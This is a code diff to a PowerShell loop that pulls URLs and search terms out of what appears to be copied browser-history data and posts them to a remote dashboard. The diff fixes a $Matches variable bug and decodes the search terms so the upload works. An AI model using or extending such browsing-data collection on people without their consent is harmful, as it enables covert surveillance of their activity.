@@ -26,17 +26,24 @@ while($true) {
                 $RawData = Get-Content -Path $TempPath -Raw -Encoding Byte
                 $StringData = [System.Text.Encoding]::UTF8.GetString($RawData)
                 
-                # Match common URLs (basic regex for dashboard purposes)
-                $Matches = [regex]::Matches($StringData, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}[^\s\x00-\x1F]*')
-                
+                # Match common URLs (basic regex for dashboard purposes).
+                # NOTE: do not name this $Matches - that is PowerShell's automatic
+                # variable and the -match operator below overwrites it.
+                $UrlMatches = [regex]::Matches($StringData, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}[^\s\x00-\x1F]*')
+
                 # Get uniquely recent ones (last 5 to keep pings light)
-                $UniqueUrls = $Matches.Value | Select-Object -Unique | Select-Object -Last 5
+                $UniqueUrls = $UrlMatches.Value | Select-Object -Unique | Select-Object -Last 5
 
                 foreach ($Url in $UniqueUrls) {
-                    # 4. Detect Search Terms
+                    # 4. Detect Search Terms.
+                    # After -match, $Matches is a hashtable: $Matches[1] is the first
+                    # capture group. Reading it as a MatchCollection threw, and because
+                    # the outer catch swallows errors that aborted the whole POST loop
+                    # for every URL containing q= or query=.
                     $SearchTerm = ""
-                    if ($Url -match "q=([^&]+)") { $SearchTerm = $Matches[0].Groups[1].Value }
-                    if ($Url -match "query=([^&]+)") { $SearchTerm = $Matches[0].Groups[1].Value }
+                    if ($Url -match "[?&]q=([^&]+)") { $SearchTerm = $Matches[1] }
+                    elseif ($Url -match "[?&]query=([^&]+)") { $SearchTerm = $Matches[1] }
+                    if ($SearchTerm) { $SearchTerm = [System.Uri]::UnescapeDataString($SearchTerm.Replace('+', ' ')) }
 
                     # 5. POST to Dashboard
                     $Payload = @{
